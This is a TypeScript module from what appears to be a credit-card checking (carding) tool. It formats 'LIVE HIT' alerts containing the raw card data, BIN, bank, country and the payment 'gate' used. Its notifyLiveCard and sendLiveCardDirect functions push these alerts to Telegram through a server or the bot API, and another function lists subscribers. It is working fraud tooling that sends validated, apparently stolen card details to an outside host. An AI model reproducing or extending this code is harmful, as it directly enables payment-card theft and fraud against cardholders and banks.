const TG_API = 'https://api.telegram.org/bot'
const API_BASE = import.meta.env.VITE_PAYMENTS_API ?? ''
const SERVER_URL = API_BASE

export interface LiveCardPayload {
  raw: string
  number: string
  bin: string
  brand: string
  bank: string
  country: string
  countryEmoji: string
  cardType: string
  cardCategory: string
  gateName: string
  message: string
  checkedAt: number
}

function escapeMd(text: string): string {
  return text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1')
}

function fmtCard(payload: LiveCardPayload): string {
  const lines = [
    `🔥 *LIVE HIT* 🔥`,
    ``,
    `\`\`\``,
    `${escapeMd(payload.raw)}`,
    `\`\`\``,
    ``,
    `╭── *GATE* ──╮`,
    `│ ${escapeMd(payload.gateName)}`,
    `╰────────────╯`,
    ``,
    `├ BIN:     \`${escapeMd(payload.bin)}\``,
    `├ BRAND:   ${escapeMd(payload.brand)}`,
    `├ BANK:    ${escapeMd(payload.bank)}`,
    `├ COUNTRY: ${payload.countryEmoji} ${escapeMd(payload.country)}`,
    `└ TYPE:    ${escapeMd(payload.cardType)} \\| ${escapeMd(payload.cardCategory)}`,
    ``,
    `✅ *${escapeMd(payload.message)}*`,
  ]
  return lines.join('\n')
}

/**
 * Notifica al server sobre una live card detectada por el user actual.
 * El server envia la live SOLO al telegram_id de ese user. Sin broadcast.
 */
export async function notifyLiveCard(payload: LiveCardPayload, token: string): Promise<{ ok: boolean; sent?: boolean; reason?: string; error?: string }> {
  try {
    const res = await fetch(`${SERVER_URL}/api/telegram/notify-live`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
      body: JSON.stringify({ payload }),
    })
    const data = await res.json().catch(() => ({}))
    if (!res.ok) {
      console.warn('[Telegram] notify-live failed:', res.status, data)
      return { ok: false, error: data.error || `HTTP ${res.status}` }
    }
    console.log('[Telegram] notify-live:', data)
    return { ok: true, ...data }
  } catch (err) {
    console.warn('[Telegram] notify-live network error:', err)
    return { ok: false, error: String(err) }
  }
}

/** @deprecated usar notifyLiveCard */
export async function broadcastLiveCard(payload: LiveCardPayload, botToken: string): Promise<{ sent: number; total: number }> {
  return { sent: 0, total: 0 }
}

/** @deprecated usar notifyLiveCard */
export async function sendLiveCard(payload: LiveCardPayload, botToken: string, chatId: string): Promise<boolean> {
  return false
}

/** @deprecated */
export async function sendLiveCardDirect(payload: LiveCardPayload, botToken: string, chatId: string): Promise<boolean> {
  if (!botToken || !chatId) return false

  const text = fmtCard(payload)
  const url = `${TG_API}${botToken}/sendMessage`

  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'MarkdownV2',
        disable_web_page_preview: true,
      }),
    })

    if (!res.ok) {
      const err = await res.json().catch(() => ({}))
      console.warn('[Telegram] Failed to send:', err)
      return false
    }
    return true
  } catch (err) {
    console.warn('[Telegram] Network error:', err)
    return false
  }
}

export async function testTelegramConnection(botToken: string, chatId: string): Promise<{ ok: boolean; error?: string }> {
  if (!botToken) return { ok: false, error: 'Bot token is empty' }
  if (!chatId) return { ok: false, error: 'Chat ID is empty' }
  try {
    const res = await fetch(`${SERVER_URL}/api/telegram/test`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ botToken, chatId }),
    })
    return await res.json()
  } catch (err) {
    return { ok: false, error: String(err) }
  }
}

/** Fetch subscribers from the server */
export async function fetchSubscribers(): Promise<{ chat_id: string; username: string | null; first_name: string | null; subscribed_at: string }[]> {
  try {
    const res = await fetch(`${SERVER_URL}/api/telegram/subscribers`)
    if (!res.ok) return []
    const data = await res.json()
    return data.subscribers || []
  } catch {
    return []
  }
}
